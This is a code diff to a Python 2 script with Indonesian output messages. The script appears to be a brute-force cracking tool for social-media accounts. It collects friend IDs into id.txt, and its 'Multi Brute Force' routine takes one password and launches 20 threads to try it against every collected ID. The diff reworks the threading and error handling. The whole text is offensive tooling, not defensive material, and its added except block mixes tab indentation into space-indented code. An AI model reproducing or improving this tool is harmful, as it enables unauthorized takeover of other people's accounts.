@@ -5,6 +5,7 @@ import json
 import urllib
 import random
 import hashlib
+import threading
 from multiprocessing.pool import ThreadPool
 from mechanize import Browser
 from requests.exceptions import ConnectionError
@@ -103,8 +104,8 @@ def id_konco():
                 print h+" Mengambil id"+ iq['name'] + iq['id']
                 print p+" Jumlah Id Yg Terambil %s" % len(id_koncomu)
                 print p+" File Disimpan Dengan Nama" + simpan_id
-                simpan_id.close()
-                mbf()
+            simpan_id.close()
+            mbf()
         except IOError:
             print m+" Terjadi Kesalahan..."
 
@@ -122,15 +123,17 @@ def mbf():
         print h+" Multi Brute Force."
         list_id = open('id.txt', 'r').read()
         password = raw_input(p+" Masukkan Password : ")
-        
-        file_id = open('id.txt', 'r')
-        for iq in range(20):
+        try:
+            file_id = open('id.txt', 'r')
+            for iq in range(20):
                 dev = threading.Thread(target=cracking, args=())
                 dev.start()
                 threads.append(dev)
 
-        for dev in threads:
+            for dev in threads:
                 dev.join()
+	except IOError:
+	    print m+" File ID tidak Ditemukan"
 
 def cracking():
     global count
